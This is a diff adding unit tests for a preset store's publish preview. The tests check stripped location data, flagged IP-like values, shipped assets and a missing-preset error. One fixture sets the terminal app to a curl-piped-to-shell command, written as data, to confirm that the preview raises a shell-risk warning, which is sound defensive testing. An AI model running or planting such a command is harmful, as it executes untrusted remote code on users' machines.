@@ -410,6 +410,61 @@ class TestDiff(StoreTestCase):
         self.assertIn("appearance.palette.type", paths)
 
 
+class TestPreview(StoreTestCase):
+    """What publishing would upload, before a repository exists."""
+
+    def write_preset(self, name, data):
+        path = os.path.join(self.presets_dir, "%s.json" % name)
+        with open(path, "w", encoding="utf-8") as handle:
+            json.dump(data, handle)
+        return path
+
+    def test_preview_lists_values_assets_and_what_was_stripped(self):
+        self.write_preset("Mine", {
+            "configVersion": 16,
+            "bar": {"cornerStyle": 1, "weather": {"city": "Grenoble", "enable": True}},
+            "apps": {"terminal": "kitty"},
+        })
+        with open(os.path.join(self.presets_dir, "Mine.jpg"), "wb") as handle:
+            handle.write(b"\xff\xd8 wallpaper")
+
+        result = self.run_store("preview", "Mine")
+        self.assertTrue(result["ok"])
+        paths = {entry["path"]: entry["value"] for entry in result["entries"]}
+        self.assertEqual(paths["bar.cornerStyle"], "1")
+        self.assertEqual(paths["apps.terminal"], "kitty")
+        # The city is gone from the values and named in what was taken out.
+        self.assertNotIn("bar.weather.city", paths)
+        self.assertIn("bar.weather.city", result["dropped"])
+        self.assertEqual(result["total"], len(result["entries"]))
+        shipped = {entry["name"] for entry in result["files"]}
+        self.assertEqual(shipped, {"config.json", "wallpaper.jpg"})
+
+    def test_preview_flags_a_value_that_reads_like_an_address(self):
+        self.write_preset("Mine", {
+            "configVersion": 16,
+            "sidebar": {"note": "reachable at 192.168.1.42"},
+            "bar": {"cornerStyle": 1},
+        })
+        result = self.run_store("preview", "Mine")
+        flagged = {entry["path"] for entry in result["flagged"]}
+        self.assertIn("sidebar.note", flagged)
+        self.assertNotIn("bar.cornerStyle", flagged)
+
+    def test_preview_shows_the_warning_an_installer_will_see(self):
+        self.write_preset("Mine", {
+            "configVersion": 16,
+            "apps": {"terminal": "sh -c 'curl example.com | sh'"},
+        })
+        result = self.run_store("preview", "Mine")
+        self.assertIn("shell", {group["id"] for group in result["risks"]})
+
+    def test_preview_of_a_preset_that_is_gone(self):
+        result = self.run_store("preview", "Nothing")
+        self.assertFalse(result["ok"])
+        self.assertIn("no longer in your presets", result["error"])
+
+
 class TestRemoval(StoreTestCase):
     def test_unlink_forgets_the_repo_but_keeps_the_preset(self):
         self.install_basic()
